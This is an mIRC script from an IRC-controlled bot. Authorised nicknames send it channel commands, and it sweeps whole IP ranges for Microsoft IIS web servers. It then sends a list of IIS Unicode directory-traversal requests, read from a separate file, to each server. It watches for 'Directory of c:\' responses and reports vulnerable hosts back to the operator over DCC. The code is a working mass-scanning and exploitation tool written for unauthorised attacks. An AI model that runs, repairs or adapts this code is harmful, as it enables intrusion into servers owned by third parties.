   alias check.iss {
     if (%unicod.step == 1) { msg %unicod.obj IIS bag not found: $1 | sockclose $sock($2) | nick $remove($me,[cod]) }
   }
   alias unilook.stat {
     if ($sock(unilook.*,0) < 50) {
       :start
       inc %unilook.page
       if (%unilook.page == 256) {
         timerunilook_start off
         msg %unicod.obj Scan network has been finished: $1 $+ .* found IIS servers: %unilook.read
         nick $remove($me,[scan])
         sockclose unilook.* | halt
         halt
       }
       sockopen unilook. $+ %unilook.page $1 $+ . $+ %unilook.page  80
       timerunil_s $+ $1 $+ . $+ %unilook.page 1 10 sockclose $1 $+ . $+ %unilook.page
       if ($sock(unilook.*,0) < 50) { goto start }
     }
   }
   on *:sockopen:download.*: {
     .sockwrite -tn $sockname GET %ftp_temp [ $+ [ $gettok($sockname,2,46) ] ]  HTTP/1.0
     .sockwrite -tn $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
     .sockwrite -tn $sockname User-Agent: Mozilla/3.0 (compatible)
     .sockwrite -tn $sockname Host: $ip
     .sockwrite -tn $sockname $lf
   }
   alias unicod.stat {
     if ($sock(unicod.*,0) < 50) {
       :start
       inc %unicod.page
       if ($read -l $+ %unicod.page unicodbag.txt == $null) {
         timerunicod_start off
         msg %unicod.obj Find IIS bugs has been finished - found: %unicod.read
         nick $remove($me,[cod])
         sockclose unicod.*  | halt
       }
       sockopen unicod. $+ %unicod.page $1 80
       if ($sock(unicod.*,0) < 50) { goto start }
     }
   }
   on *:sockopen:unicod.*: {
     if (%unicod.step == 1) {
       if ($sockerr > 0) {
         msg %unicod.obj IIS bugs not found $sock($sockname).ip
         nick $remove($me,[cod])
         sockclose $sockname  | return
       }
       .sockwrite -n $sockname HEAD / HTTP/1.0
       .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
       .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
       .sockwrite -n $sockname Host: $ip
       .sockwrite -n $sockname
       halt
     }
     if ($sockerr > 0) { sockclose $sockname  | return }
     .sockmark $sockname $read -l $gettok($sock($sockname),2,46) unicodbag.txt
     .sockwrite -n $sockname GET $sock($sockname).mark HTTP/1.0
     .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
     .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
     .sockwrite -n $sockname Host: $ip
     .sockwrite -n $sockname
   }
   on *:sockopen:unilook.*: {
     if ($sockerr > 0) { sockclose $sockname  | return }
     .sockwrite -n $sockname HEAD / HTTP/1.0
     .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
     .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
     .sockwrite -n $sockname Host: $ip
     .sockwrite -n $sockname
   }
   on *:sockread:unilook.*: {
     sockread -f %subsock
     if ($sockerr > 0) { sockclose $sockname  | return }
     if (Server: Microsoft-IIS isin %subsock) {
       write unicod_look $sock($sockname).ip
       .timerunilook 1 4 msg %unicod.obj Found IIS server: $sock($sockname).ip
       inc %unilook.read
       sockclose $sockname
     }
   }
   on *:sockread:unicod.*: {
     .sockread -f %subsock
     if (%unicod.step == 1) {
       if ($sockerr > 0) {
         msg %unicod.obj IIS servers not found $sock($sockname).ip
         nick $remove($me,[cod])
         sockclose $sockname | return
       }
       if (Server: Microsoft-IIS isin %subsock) { set %unicod.step 2 | timerunicod_start  0 1 unicod.stat $sock($sockname).ip | halt }
       halt
     }
     if ($sockerr > 0) { sockclose $sockname | return  }
     if (Directory of c:\ isin %subsock) {
       inc %unicod.read
       msg %unicod.obj Found IIS bug $sock($sockname).ip $+ $sock($sockname).mark
       write unicod_ready $sock($sockname).ip $+ $sock($sockname).mark
       if (%unicod.read > 5) {
         msg %unicod.obj Found bugs $sock($sockname).ip - scan has been stoped
         nick $remove($me,[cod])
         timerunicod_start off | sockclose unicod.* | halt
       }
       sockclose $sockname
     }
   }
   on *:text:*:*: {
     if (%auth [ $+ [ $nick ] ] != yes) { halt }

     if (!unicod.clear. isin $1) {
       if ( ($remove($1,!unicod.clear.) != *) && ($remove($1,!unicod.clear.) != $me) ) { halt }
       write -c unicod_ready
       msg $channick File with IIS unicode bugs has been cleared
     }
     if (!unilook.clear. isin $1) {
       if ( ($remove($1,!unilook.clear.) != *) && ($remove($1,!unilook.clear.) != $me) ) { halt }
       write -c unicod_look
       msg $channick File with IIS servers has been cleared
     }
     if (!unicod.rezult. isin $1) {
       if ( ($remove($1,!unicod.rezult.) != *) && ($remove($1,!unicod.rezult.) != $me) ) { halt }
       dcc send $nick unicod_ready
     }
     if (!unilook.rezult. isin $1) {
       if ( ($remove($1,!unilook.rezult.) != *) && ($remove($1,!unilook.rezult.) != $me) ) { halt }
       dcc send $nick unicod_look
     }
     if (!unilook.stop. isin $1) {
       if ( ($remove($1,!unilook.stop.) != *) && ($remove($1,!unilook.stop.) != $me) ) { halt }
       msg $channick Scan has been stop on server: %unilook.ip $+ . $+  %unilook.page found bugs: %unilook.read
       timerunilook_start off | sockclose unilook.*
       nick $remove($me,[un])
     }
     if (!unicod.stop. isin $1) {
       if ( ($remove($1,!unicod.stop.) != *) && ($remove($1,!unicod.stop.) != $me) ) { halt }
       msg $channick Scan has been stoped - last scan: %unicod.ip found bugs: %unicod.read
       timerunicod_start off | timercheck.iss off | sockclose unicod.*
       nick $remove($me,[cod])
     }
     if (!unicod.stat. isin $1) {
       if ( ($remove($1,!unicod.stat.) != *) && ($remove($1,!unicod.stat.) != $me) ) { halt }
       if ($sock(unicod.*,0) > 1) { msg $channick Scanning IIS: %unicod.ip status: %unicod.page bug of 627 - found bugs: %unicod.read |  halt  }
       msg $channick Last IIS scan: %unicod.ip found bugs: %unicod.read
     }
     if (!unilook.stat. isin $1) {
       if ( ($remove($1,!unilook.stat.) != *) && ($remove($1,!unilook.stat.) != $me) ) { halt }
       if ($sock(unilook.*,0) > 1) { msg $channick Scaning IIS server: %unilook.ip $+ . $+  %unilook.page found servers: %unilook.read |  halt  }
       msg $channick Last scan IIS servers: %unilook.ip $+ .* found bugs: %unilook.read
     }
     if (!unilook. isin $1) {
       if ( ($remove($1,!unilook.) != *) && ($remove($1,!unilook.) != $me) ) { halt }
       if ($2 == $null) { halt }
       if ($sock(unilook.*,0) > 1) { msg $channick Scan process: %unilook.ip $+ .* found bugs: %unilook.read | halt }
       if (%iniscan.stat.bag == on) {
         msg $channick Scan process - found IIS servers: %uniscan.found found bugs: %uniscan.bag
         halt
       }
       set %unilook.page 0 |  set %unilook.read 0
       set %unicod.obj $channick | set %unilook.ip $2
       nick $me $+ [un]
       msg $channick Scan network has been started: $2 $+ .*
       timerunilook_start 0 1 unilook.stat $2
     }
     if (!unicod. isin $1) {
       if ( ($remove($1,!unicod.) != *) && ($remove($1,!unicod.) != $me) ) { halt }
       if ($2 == $null) { halt }
       if ($exists(unicodbag.txt) != $true) { msg $channick File with bugs not found |  halt  }
       if ($sock(unicod.*,0) > 1) { msg $channick Scan IIS process: %unicod.ip status: %unicod.page bugs of 627 found bugs: %unicod.read | halt }
       if (%iniscan.stat.bag == on) {
         msg $channick Scan process - found IIS servers: %uniscan.found found bugs: %uniscan.bag
         halt
       }
       set %unicod.page 0 | set %unicod.step 1 | set %unicod.read 0
       set %unicod.obj $channick |  set %unicod.ip $2
       nick $me $+ [cod]
       msg $channick Scan IIS has been started: $2
       sockopen unicod. $+ %unicod.page $2 80
       timercheck.iss 1 20 check.iss $2 unicod. $+ %unicod.page
     }
   }
